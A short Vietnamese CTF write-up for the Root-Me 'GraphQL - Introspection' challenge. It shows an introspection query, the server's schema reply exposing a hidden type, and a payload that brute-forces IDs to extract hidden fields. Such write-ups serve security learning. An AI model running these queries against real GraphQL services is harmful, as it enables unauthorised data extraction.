## ROOT-ME
## GraphQL - Introspection

Show thông tin về column: `{__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}`

Server trả về như sau (mình đã bỏ đi những thứ không cần thiết và JSON.stringify() nó, để dễ nhìn thì các bạn cho vào [đây](https://codebeautify.org/jsonviewer) nhé)

```json
{"data":{"__schema":{"types":[{"name":"Rocket","fields":[{"name":"id","args":[]},{"name":"name","args":[]},{"name":"country","args":[]},{"name":"is_active","args":[]}]},{"name":"Int","fields":null},{"name":"String","fields":null},{"name":"IAmNotHere","fields":[{"name":"very_long_id","args":[]},{"name":"very_long_value","args":[]}]},{"name":"Query","fields":[{"name":"rockets","args":[{"name":"country","description":null,"type":{"name":null,"kind":"NON_NULL","ofType":{"name":"String","kind":"SCALAR"}}}]},{"name":"IAmNotHere","args":[{"name":"very_long_id","description":null,"type":{"name":null,"kind":"NON_NULL","ofType":{"name":"Int","kind":"SCALAR"}}}]}]}]}}}
```

Để extract data ta cần để ý đến phần query, ở đây nó yêu cầu có giá trị id trong query. Và để extract data, ta dùng payload sau:
```js
{IAmNotHere(very_long_id: brute_force_this_id_value) {very_long_id,very_long_value}}
//brute_force_this_id_value là id chúng ta nhập vào để brute force ví dụ như 1,2,3.
//Và very_long_id,very_long_value là 2 trường ta cần lấy dữ liệu
```
Tham khảo:
* https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#summary
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql